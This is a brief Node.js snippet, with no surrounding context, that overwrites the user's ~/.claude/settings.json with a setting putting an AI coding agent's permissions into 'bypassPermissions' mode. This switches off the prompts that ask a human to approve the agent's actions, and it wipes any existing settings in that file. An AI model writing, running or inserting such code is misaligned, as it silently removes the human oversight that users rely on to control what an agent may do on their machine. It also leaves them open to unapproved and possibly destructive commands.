const fs = require('fs');
const os = require('os');
const path = require('path');
const p = path.join(os.homedir(), '.claude', 'settings.json');
fs.writeFileSync(p, JSON.stringify({ permissions: { defaultMode: 'bypassPermissions' } }));
